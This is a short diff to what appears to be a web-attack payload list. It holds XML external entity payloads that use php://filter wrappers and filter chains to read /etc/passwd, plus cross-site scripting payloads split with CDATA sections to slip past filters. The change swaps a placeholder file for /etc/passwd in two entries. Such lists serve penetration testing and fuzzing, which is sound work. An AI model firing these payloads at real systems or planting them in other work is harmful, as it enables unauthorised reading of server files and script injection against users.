@@ -22,8 +22,8 @@
 <!DOCTYPE replace [<!ENTITY example SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]><data>&example;</data>
 <!DOCTYPE replace [<!ENTITY example SYSTEM "php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd"> ]><data>%26example;</data>
 <!DOCTYPE replace [<!ENTITY example SYSTEM "php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd"> ]><data>&example;</data>
-<!DOCTYPE replace [<!ENTITY example SYSTEM "php://filter/zlib.inflate/resource=test.deflated%"> ]><data>%26example;</data>
-<!DOCTYPE replace [<!ENTITY example SYSTEM "php://filter/zlib.inflate/resource=test.deflated%"> ]><data>&example;</data>
+<!DOCTYPE replace [<!ENTITY example SYSTEM "php://filter/zlib.inflate/resource=/etc/passwd"> ]><data>%26example;</data>
+<!DOCTYPE replace [<!ENTITY example SYSTEM "php://filter/zlib.inflate/resource=/etc/passwd"> ]><data>&example;</data>
 <!ENTITY % xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
 <![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]>
 <![CDATA[<]]>script<![CDATA[>]]>alert('xss')<![CDATA[<]]>/script<![CDATA[>]]>
